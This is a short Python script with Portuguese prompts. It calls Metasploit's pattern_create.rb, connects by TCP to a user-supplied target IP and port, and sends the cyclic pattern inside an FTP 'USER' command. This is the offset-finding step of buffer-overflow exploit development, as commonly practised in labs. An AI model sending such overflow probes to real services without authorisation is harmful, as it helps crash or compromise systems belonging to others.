import subprocess
import socket
import time

def create_pattern():
    # Solicitar número de bytes para criar o padrão
    num_bytes = int(input("Digite o número de bytes do padrão: "))
    
    # Executar o comando pattern_create.rb
    output = subprocess.check_output(
        ["/usr/share/metasploit-framework/tools/exploit/pattern_create.rb", "-l", str(num_bytes)]
    )
    
    pattern = output.decode()
    
    # Exibir o padrão criado
    print("\n--- pattern_create ---")
    print("Padrão criado:")
    print(pattern)
    
    # Perguntar ao usuário se deseja enviar o padrão para a aplicação
    send_choice = input("\nDeseja enviar este padrão para a aplicação? (s/n): ").lower()
    if send_choice == 's':
        send_pattern(pattern)
    else:
        print("Encerrando o programa.")
        exit()

def send_pattern(pattern):
    try:
        # Solicitar IP e porta do alvo
        ip = input("Digite o IP do alvo: ")
        port = int(input("Digite a porta do alvo: "))
        
        # Conectar ao IP e porta usando um socket TCP
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, port))
        s.recv(1024)
        
        # Enviar o padrão como parte do comando USER
        print(f"[+] Enviando padrão para {ip}:{port}")
        s.send(b"USER " + pattern.encode() + b"\r\n")
        print(s.recv(1024))
        
        # Enviar comando para encerrar a conexão
        s.send(b"QUIT\r\n")
        s.close()
    except socket.error as e:
        print(f"[!] Erro ao conectar: {e}")
    except KeyboardInterrupt:
        print("\n[!] Envio interrompido pelo usuário.")
    finally:
        print("Programa finalizado.")

if __name__ == "__main__":
    create_pattern()
